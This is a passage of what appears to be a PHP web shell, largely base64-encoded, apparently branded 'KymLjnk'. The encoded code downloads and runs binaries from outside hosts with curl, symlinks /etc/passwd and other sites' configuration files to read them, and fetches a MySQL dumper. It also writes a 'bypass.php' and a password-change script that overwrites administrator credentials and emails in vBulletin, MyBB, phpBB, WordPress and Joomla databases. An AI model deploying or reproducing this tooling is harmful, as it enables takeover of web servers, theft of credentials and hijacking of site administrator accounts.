d01FWkdSa1k3SUhSbGVIUXRkSEpoYm5ObWIzSnRPblZ3Y0dWeVkyRnpaVHNnYUdWcFoyaDBPakl6T3lCaVlXTnJaM0p2ZFc1a0xXTnZiRzl5T2lNd1F6QkRNRU1pSUM4K1BDOXdQZ284TDJadmNtMCtKenNLZldWc2MyVjdDa0JzYVc1bGN5QTlQQ1JHVDFKTmUzQmhjM045UGpzS0pIa2dQU0JBYkdsdVpYTTdDbTl3Wlc0Z0tFMVpSa2xNUlN3Z0lqNTBZWEl1ZEcxd0lpazdDbkJ5YVc1MElFMVpSa2xNUlNBaWRHRnlJQzFqZW1ZZ0lpNGtSazlTVFh0MFlYSjlMaUl1ZEdGeUlDSTdDbVp2Y2lBb0pHdGhQVEE3Skd0aFBDUjVPeVJyWVNzcktYc0tkMmhwYkdVb1FHeHBibVZ6V3lScllWMGdJRDErSUcwdktDNHFQeWs2ZURvdlp5bDdDaVpzYVd3b0pERXBPd3B3Y21sdWRDQk5XVVpKVEVVZ0pERXVJaTUwZUhRZ0lqc0tabTl5S0NSclpEMHhPeVJyWkR3eE9Ec2thMlFyS3lsN0NuQnlhVzUwSUUxWlJrbE1SU0FrTVM0a2EyUXVJaTUwZUhRZ0lqc0tmUXA5Q2lCOUNuQnlhVzUwSnp4aWIyUjVJR05zWVhOelBTSnVaWGRUZEhsc1pURWlJR0puWTI5c2IzSTlJaU13TURBd01EQWlQZ284Y0Q1RWIyNWxJQ0VoUEM5d1BnbzhjRDRtYm1KemNEczhMM0ErSnpzS2FXWW9KRVpQVWsxN2RHRnlmU0J1WlNBaUlpbDdDbTl3Wlc0b1NVNUdUeXdnSW5SaGNpNTBiWEFpS1RzS1FHeHBibVZ6SUQwOFNVNUdUejRnT3dwamJHOXpaU2hKVGtaUEtUc0tjM2x6ZEdWdEtFQnNhVzVsY3lrN0NuQnlhVzUwSnp4d1BqeGhJR2h5WldZOUlpY3VKRVpQVWsxN2RHRnlmUzRuTG5SaGNpSStQR1p2Ym5RZ1kyOXNiM0k5SWlNd01FWkdNREFpUGdvOGMzQmhiaUJ6ZEhsc1pUMGlkR1Y0ZEMxa1pXTnZjbUYwYVc5dU9pQnViMjVsSWo1RGJHbGpheUJJWlhKbElGUnZJRVJ2ZDI1c2IyRmtJRlJoY2lCR2FXeGxQQzl6Y0dGdVBqd3ZabTl1ZEQ0OEwyRStQQzl3UGljN0NuMEtmUW9nY0hKcGJuUWlDand2WW05a2VUNEtQQzlvZEcxc1BpSTcNCic7DQoNCiRmaWxlID0gZm9wZW4oImNvbmZpZy5pem8iICwidysiKTsNCiR3cml0ZSA9IGZ3cml0ZSAoJGZpbGUgLGJhc2U2NF9kZWNvZGUoJGNvbmZpZ3NoZWxsKSk7DQpmY2xvc2UoJGZpbGUpOw0KICAgIGNobW9kKCJjb25maWcuaXpvIiwwNzU1KTsNCiAgIGVjaG8gIjxpZnJhbWUgc3JjPWFsbGNvbmZpZy9jb25maWcuaXpvIHdpZHRoPTEwMCUgaGVpZ2h0PTEwMCUgZnJhbWVib3JkZXI9MD48L2lmcmFtZT4gIjsNCn0NCmlmIChpc3NldCgkX1BPU1RbJ1N1Ym1pdDE1J10pKQ0Kew0KICAgIG1rZGlyKCdieXBhc3NiaW4nLCAwNzU1KTsNCiAgICBjaGRpcignYnlwYXNzYmluJyk7DQoNCkBleGVjKCdjdXJsIGh0dHA6Ly9icnV0YWxjcmFmdC5wdXNrdS5jb20vY2xvd25fZnVuY3Rpb25zL2xuIC1vIGxuJyk7DQpAZXhlYygnY2htb2QgNzU1IC4vbG4nKTsNCkBleGVjKCcuL2xuIC1zIC9ldGMvcGFzc3dkIDkxLnBocCcpOw0KICAgZWNobyAiPGlmcmFtZSBzcmM9YnlwYXNzYmluLzkxLnBocCB3aWR0aD0xMDAlIGhlaWdodD0xMDAlIGZyYW1lYm9yZGVyPTA+PC9pZnJhbWU+ICI7DQp9DQoNCmlmIChpc3NldCgkX1BPU1RbJ1N1Ym1pdDE2J10pKQ0Kew0KQG1rZGlyKCJteXNxbGR1bXBlciIpOw0KQGNoZGlyKCJteXNxbGR1bXBlciIpOw0KQGV4ZWMoJ2N1cmwgaHR0cDovL2RsLmRyb3Bib3guY29tL3UvNzQ0MjUzOTEvbXlzcWxkdW1wZXIudGFyLmd6IC1vIG15c3FsZHVtcGVyLnRhci5neicpOw0KQGV4ZWMoJ3RhciAteHZmIG15c3FsZHVtcGVyLnRhci5neicpOw0KCWVjaG8gIjxpZnJhbWUgc3JjPW15c3FsZHVtcGVyL2luZGV4LnBocCB3aWR0aD0xMDAlIGhlaWdodD0xMDAlIGZyYW1lYm9yZGVyPTA+PC9pZnJhbWU+ICI7DQp9DQo/Pg0KDQogICAgICAgIDx0ZCBjbGFzcz0ndGQnIHN0eWxlPSdib3JkZXItYm90dG9tLXdpZHRoOnRoaW47Ym9yZGVyLXRvcC13aWR0aDp0aGluJz48Zm9ybSBuYW1lPSdGMScgbWV0aG9kPSdwb3N0Jz4NCiAgICAgICAgICAgIDxkaXYgYWxpZ249J2xlZnQnPg0KCQkJICA8aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSdTdWJtaXQxNCcgdmFsdWU9JyBDcmVhdCBQeXRob24gICc+DQoJCQkgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J1N1Ym1pdDEzJyB2YWx1ZT0nIENyZWF0ICBDZ2kgICAgJz4NCiAgICAgICAgICAgICAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nU3VibWl0MTEnIHZhbHVlPScxLlN5bSBBbGwgQ29uZmlnJz4NCgkJCSAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nU3VibWl0NycgdmFsdWU9JzIuSHRhY2Nlc3MgQWxsIENvbmZpZyc+DQoJCQkgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J1N1Ym1pdDE1JyB2YWx1ZT0nIC9ldGMvcGFzc3dkICAgJz4NCgkJCSAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nU3VibWl0MTAnIHZhbHVlPSd0YXIgLXh2ZiBTeW0udGFyJz4NCgkJCSAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nU3VibWl0MTInIHZhbHVlPScxLlN5bSBMaW5rIFVzZXIgJz4NCgkJCSAgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J1N1Ym1pdDknIHZhbHVlPScyLkh0YWNjZXNzIExpc3QgJz4NCgkJCSAgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J1N1Ym1pdDgnIHZhbHVlPSczLkh0YWNjZXNzIEVtcHR5Jz4NCgkJCSAgPC9mb3JtPg0KICAgIDwvdGQ+DQogICANCjwvYm9keT4NCjwvaHRtbD4=
    ';
        $file       = fopen("bypass.php", "w+");
        $write      = fwrite($file, base64_decode($perltoolss));
        fclose($file);
        echo "<iframe src=bypass.php width=100% height=720px frameborder=0></iframe> ";
    } elseif ($action == 'changepas') {
        $file       = fopen($dir . "change-pas.php", "w+");
        $perltoolss = 'PD9waHAKLy9CZWdpbmluZyBvZiBDb2RpbmcKZXJyb3JfcmVwb3J0aW5nKDApOwogICAgJGluZm8gPSAkX1NFUlZFUlsnU0VSVkVSX1NPRlRXQVJFJ107CiAgICAkc2l0ZSA9IGdldGVudigiSFRUUF9IT1NUIik7CiAgICAkcGFnZSA9ICRfU0VSVkVSWydTQ1JJUFRfTkFNRSddOwogICAgJHNuYW1lID0gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ107CiAgICAkdW5hbWUgPSBwaHBfdW5hbWUoKTsKICAgICRzbW9kID0gaW5pX2dldCgnc2FmZV9tb2RlJyk7CiAgICAkZGlzZnVuYyA9IGluaV9nZXQoJ2Rpc2FibGVfZnVuY3Rpb25zJyk7CiAgICAkeW91cmlwID0gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ107CiAgICAkc2VydmVyaXAgPSAkX1NFUlZFUlsnU0VSVkVSX0FERFInXTsKCQovL1RpdGxlCmVjaG8gIjxoZWFkPgo8c3R5bGU+CmJvZHkgeyBmb250LXNpemU6IDEycHg7CiAgICAgICAgICAgZm9udC1mYW1pbHk6IGFyaWFsLCBoZWx2ZXRpY2E7CiAgICAgICAgICAgIHNjcm9sbGJhci13aWR0aDogNTsKICAgICAgICAgICAgc2Nyb2xsYmFyLWhlaWdodDogNTsKICAgICAgICAgICAgc2Nyb2xsYmFyLWZhY2UtY29sb3I6IGJsYWNrOwogICAgICAgICAgICBzY3JvbGxiYXItc2hhZG93LWNvbG9yOiBzaWx2ZXI7CiAgICAgICAgICAgIHNjcm9sbGJhci1oaWdobGlnaHQtY29sb3I6IHNpbHZlcjsKICAgICAgICAgICAgc2Nyb2xsYmFyLTNkbGlnaHQtY29sb3I6c2lsdmVyOwogICAgICAgICAgICBzY3JvbGxiYXItZGFya3NoYWRvdy1jb2xvcjogc2lsdmVyOwogICAgICAgICAgICBzY3JvbGxiYXItdHJhY2stY29sb3I6IGJsYWNrOwogICAgICAgICAgICBzY3JvbGxiYXItYXJyb3ctY29sb3I6IHNpbHZlcjsKICAgIH0KPC9zdHlsZT4KPHRpdGxlPkt5bUxqbmsgLSBbJHNpdGVdPC90aXRsZT48L2hlYWQ+IjsKLy9CdXR0b24gTGlzdAplY2hvICI8Y2VudGVyPjxmb3JtIG1ldGhvZD1QT1NUIGFjdGlvbicnPjxpbnB1dCB0eXBlPXN1Ym1pdCBuYW1lPXZidWxsZXRpbiB2YWx1ZT0ndkJ1bGxldGluJz48aW5wdXQgdHlwZT1zdWJtaXQgbmFtZT1teWJiIHZhbHVlPSdNeUJCJz48aW5wdXQgdHlwZT1zdWJtaXQgbmFtZT1waHBiYiB2YWx1ZT0ncGhwQkInPjxpbnB1dCB0eXBlPXN1Ym1pdCBuYW1lPXNtZiB2YWx1ZT0nU01GJz48aW5wdXQgdHlwZT1zdWJtaXQgbmFtZT13aG1jcyB2YWx1ZT0nV0hNQ1MnPjxpbnB1dCB0eXBlPXN1Ym1pdCBuYW1lPXdvcmRwcmVzcyB2YWx1ZT0nV29yZFByZXNzJz48aW5wdXQgdHlwZT1zdWJtaXQgbmFtZT1qb29tbGEgdmFsdWU9J0pvb21sYSc+PGlucHV0IHR5cGU9c3VibWl0IG5hbWU9cGhwLW51a2UgdmFsdWU9J1BIUC1OVUtFJz48aW5wdXQgdHlwZT1zdWJtaXQgbmFtZT11cCB2YWx1ZT0nVHJhaWRudCBVUCc+PC9mb3JtPjwvY2VudGVyPiI7CmZ1bmN0aW9uIHVwZGF0ZSgpCnsKCWVjaG8gIlsrXSBVcGRhdGUgSGFzIERvbmUgXl9eIjsKfQovL3ZCdWxsZXRpbgppZiAoaXNzZXQoJF9QT1NUWyd2YnVsbGV0aW4nXSkpCnsKZWNobyAiPGNlbnRlcj48dGFibGUgYm9yZGVyPTAgd2lkdGg9JzEwMCUnPgo8dHI+PHRkPgo8Y2VudGVyPjxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+Q2hhbmdlIHZCdWxsZXRpbiBJbmZvPGJyPlBhdGNoIENvbnRyb2wgUGFuZWwgOiBbcGF0Y2hdL2FkbWluY3A8YnI+UGF0aCBDb25maWcgOiBbcGF0Y2hdL2luY2x1ZGVzL2NvbmZpZy5waHA8YnI+aW5jbHVkZXMvaW5pdC5waHAgPC9mb250Pgo8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyNGRjAwMDAnPj4+PC9mb250Pjxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+IGluY2x1ZGVzL2NsYXNzX2NvcmUucGhwIDwvZm9udD4KPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjRkYwMDAwJz4+PjwvZm9udD48Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPiBpbmNsdWRlcy9jb25maWcucGhwPC9mb250PjwvY2VudGVyPgogICAgPGNlbnRlcj48Zm9ybSBtZXRob2Q9UE9TVCBhY3Rpb249Jyc+PGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5NeXNxbCBIb3N0PC9mb250Pjxicj48aW5wdXQgdmFsdWU9bG9jYWxob3N0IHR5cGU9dGV4dCBuYW1lPWRiaHZiIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkRCIG5hbWU8YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1mb3J1bXMgdHlwZT10ZXh0IG5hbWU9ZGJudmIgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgdXNlcjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXJvb3QgdHlwZT10ZXh0IG5hbWU9ZGJ1dmIgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgcGFzc3dvcmQ8YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1hZG1pbiB0eXBlPXBhc3N3b3JkIG5hbWU9ZGJwdmIgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+VGFibGUgcHJlZml4PGJyPjwvZm9udD48aW5wdXQgdmFsdWU9dmJfIHR5cGU9dGV4dCBuYW1lPXBydmIgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+VXNlciBhZG1pbjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPWFkbWluIHR5cGU9dGV4dCBuYW1lPXVydmIgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+TmV3IHBhc3N3b3JkIGFkbWluPGJyPjwvZm9udD48aW5wdXQgdmFsdWU9S3ltTGpuayB0eXBlPXBhc3N3b3JkIG5hbWU9cHN2YiBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5OZXcgRS1tYWlsIGFkbWluPGJyPjwvZm9udD48aW5wdXQgdmFsdWU9eW91ci1lbWFpbEB4eHh4LmNvbSB0eXBlPXRleHQgbmFtZT1lbXZiIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0NoYW5nZScgPjxicj4KICAgICAgICAgIDwvZm9ybT48L2NlbnRlcj48L3RkPjwvdHI+PC90YWJsZT48L2NlbnRlcj4iOwp9ZWxzZXsKJGRiaHZiID0gJF9QT1NUWydkYmh2YiddOwokZGJudmIgID0gJF9QT1NUWydkYm52YiddOwokZGJ1dmIgPSAkX1BPU1RbJ2RidXZiJ107CiRkYnB2YiAgPSAkX1BPU1RbJ2RicHZiJ107CiAgICAgICAgIEBteXNxbF9jb25uZWN0KCRkYmh2YiwkZGJ1dmIsJGRicHZiKTsKICAgICAgICAgQG15c3FsX3NlbGVjdF9kYigkZGJudmIpOwoKJHVydmI9c3RyX3JlcGxhY2UoIlwnIiwiJyIsJHVydmIpOwoKJHNldF91cnZiID0gJF9QT1NUWyd1cnZiJ107CgokcHN2Yj1zdHJfcmVwbGFjZSgiXCciLCInIiwkcHN2Yik7CiRwYXNzX3ZiID0gJF9QT1NUWydwc3ZiJ107CgokZW12Yj1zdHJfcmVwbGFjZSgiXCciLCInIiwkZW12Yik7CiRzZXRfZW12YiA9ICRfUE9TVFsnZW12YiddOwoKJHZiX3ByZWZpeCA9ICRfUE9TVFsncHJ2YiddOwoKJHRhYmxlX25hbWUgPSAkdmJfcHJlZml4LiJ1c2VyIiA7CgokcXVlcnkgPSAnc2VsZWN0ICogZnJvbSAnIC4gJHRhYmxlX25hbWUgLiAnIHdoZXJlIHVzZXJuYW1lPSInIC4gJHNldF91cnZiIC4gJyI7JzsKCiRyZXN1bHQgPSBteXNxbF9xdWVyeSgkcXVlcnkpOwokcm93ID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHJlc3VsdCk7CiRzYWx0ID0gJHJvd1snc2FsdCddOwokcGFzczIgPSBtZDUoJHBhc3NfdmIpOwokcGFzcyA9JHBhc3MyIC4gJHNhbHQ7Cgokc2V0X3Bzc2FsdCA9IG1kNSgkcGFzcyk7CgokbGVjb25ndGhpZW4xID0gJ1VQREFURSAnIC4gJHRhYmxlX25hbWUgLiAnIFNFVCBwYXNzd29yZD0iJyAuICRzZXRfcHNzYWx0IC4gJyIgV0hFUkUgdXNlcm5hbWU9IicgLiAkc2V0X3VydmIgLiAnIjsnOwokbGVjb25ndGhpZW4yID0gJ1VQREFURSAnIC4gJHRhYmxlX25hbWUgLiAnIFNFVCBlbWFpbD0iJyAuICRzZXRfZW12YiAuICciIFdIRVJFIHVzZXJuYW1lPSInIC4gJHNldF91cnZiIC4gJyI7JzsKCiRvazE9QG15c3FsX3F1ZXJ5KCRsZWNvbmd0aGllbjEpOwokb2sxPUBteXNxbF9xdWVyeSgkbGVjb25ndGhpZW4yKTsKCmlmKCRvazEpewplY2hvICI8c2NyaXB0PmFsZXJ0KCd2QnVsbGV0aW4gdXBkYXRlIHN1Y2Nlc3MgLiBUaGFuayBLeW1Mam5rIHZlcnkgbXVjaCA7KScpOzwvc2NyaXB0PiI7Cn0KfQoKLy9NeUJCCmlmIChpc3NldCgkX1BPU1RbJ215YmInXSkpCnsKZWNobyAiPGNlbnRlcj48dGFibGUgYm9yZGVyPTAgd2lkdGg9JzEwMCUnPgo8dHI+PHRkPgo8Y2VudGVyPjxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+Q2hhbmdlIE15QkIgSW5mbzxicj5QYXRjaCBDb250cm9sIFBhbmVsIDogW3BhdGNoXS9hZG1pbjxicj5QYXRoIENvbmZpZyA6IFtwYXRjaF0vaW5jL2NvbmZpZy5waHA8L2ZvbnQ+PC9jZW50ZXI+CiAgICA8Y2VudGVyPjxmb3JtIG1ldGhvZD1QT1NUIGFjdGlvbj0nJz48Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPk15c3FsIEhvc3Q8L2ZvbnQ+PGJyPjxpbnB1dCB2YWx1ZT1sb2NhbGhvc3QgdHlwZT10ZXh0IG5hbWU9ZGJobXkgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgbmFtZTxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPW15YmIgdHlwZT10ZXh0IG5hbWU9ZGJubXkgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgdXNlcjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXJvb3QgdHlwZT10ZXh0IG5hbWU9ZGJ1bXkgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgcGFzc3dvcmQ8YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1hZG1pbiB0eXBlPXBhc3N3b3JkIG5hbWU9ZGJwbXkgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+Q2hhbmdlIHVzZXIgYWRtaW48YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1LeW1Mam5rIHR5cGU9dGV4dCBuYW1lPXVybXkgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+Q2hhbmdlIEUtbWFpbCBhZG1pbjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXlvdXItZW1haWxAeHh4LmNvbSB0eXBlPXRleHQgbmFtZT1lbW15IHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPlRhYmxlIHByZWZpeDxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPW15YmJfIHR5cGU9dGV4dCBuYW1lPXBybXkgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0nQ2hhbmdlJyA+PC9mb3JtPjwvY2VudGVyPjwvdGQ+PC90cj48L3RhYmxlPjwvY2VudGVyPiI7Cn1lbHNlewokZGJobXkgPSAkX1BPU1RbJ2RiaG15J107CiRkYm5teSAgPSAkX1BPU1RbJ2Ribm15J107CiRkYnVteSA9ICRfUE9TVFsnZGJ1bXknXTsKJGRicG15ICA9ICRfUE9TVFsnZGJwbXknXTsKICAgICAgICAgQG15c3FsX2Nvbm5lY3QoJGRiaG15LCRkYnVteSwkZGJwbXkpOwogICAgICAgICBAbXlzcWxfc2VsZWN0X2RiKCRkYm5teSk7CgokdXJteT1zdHJfcmVwbGFjZSgiXCciLCInIiwkdXJteSk7CiRzZXRfdXJteSA9ICRfUE9TVFsndXJteSddOwoKJGVtbXk9c3RyX3JlcGxhY2UoIlwnIiwiJyIsJGVtbXkpOwokc2V0X2VtbXkgPSAkX1BPU1RbJ2VtbXknXTsKCiRteV9wcmVmaXggPSAkX1BPU1RbJ3BybXknXTsKCiR0YWJsZV9uYW1lMSA9ICRteV9wcmVmaXguInVzZXJzIiA7CgokbGVjb25ndGhpZW4zID0gIlVQREFURSAkdGFibGVfbmFtZTEgU0VUIHVzZXJuYW1lID0nIi4kc2V0X3VybXkuIicgV0hFUkUgdWlkID0nMSciOwokbGVjb25ndGhpZW40ID0gIlVQREFURSAkdGFibGVfbmFtZTEgU0VUIGVtYWlsID0nIi4kc2V0X2VtbXkuIicgV0hFUkUgdWlkID0nMSciOwoKJG9rMj1AbXlzcWxfcXVlcnkoJGxlY29uZ3RoaWVuMyk7CiRvazI9QG15c3FsX3F1ZXJ5KCRsZWNvbmd0aGllbjQpOwoKaWYoJG9rMil7CmVjaG8gIjxzY3JpcHQ+YWxlcnQoJ015QkIgdXBkYXRlIHN1Y2Nlc3MgLiBUaGFuayBLeW1Mam5rIHZlcnkgbXVjaCA7KScpOzwvc2NyaXB0PiI7Cn0KfQoKLy9waHBCQgppZiAoaXNzZXQoJF9QT1NUWydwaHBiYiddKSkKewplY2hvICI8Y2VudGVyPjx0YWJsZSBib3JkZXI9MCB3aWR0aD0nMTAwJSc+Cjx0cj48dGQ+CjxjZW50ZXI+PGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5DaGFuZ2UgcGhwQkIgSW5mbzxicj5QYXRjaCBDb250cm9sIFBhbmVsIDogW3BhdGNoXS9hZG08YnI+UGF0aCBDb25maWcgOiBbcGF0Y2hdL2NvbmZpZy5waHA8L2ZvbnQ+PC9jZW50ZXI+CiAgICA8Y2VudGVyPjxmb3JtIG1ldGhvZD1QT1NUIGFjdGlvbj0nJz48Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPk15c3FsIEhvc3Q8L2ZvbnQ+PGJyPjxpbnB1dCB2YWx1ZT1sb2NhbGhvc3QgdHlwZT10ZXh0IG5hbWU9ZGJocGhwIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkRCIG5hbWU8YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1waHBiYiB0eXBlPXRleHQgbmFtZT1kYm5waHAgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgdXNlcjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXJvb3QgdHlwZT10ZXh0IG5hbWU9ZGJ1cGhwIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkRCIHBhc3N3b3JkPGJyPjwvZm9udD48aW5wdXQgdmFsdWU9YWRtaW4gdHlwZT1wYXNzd29yZCBuYW1lPWRicHBocCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAw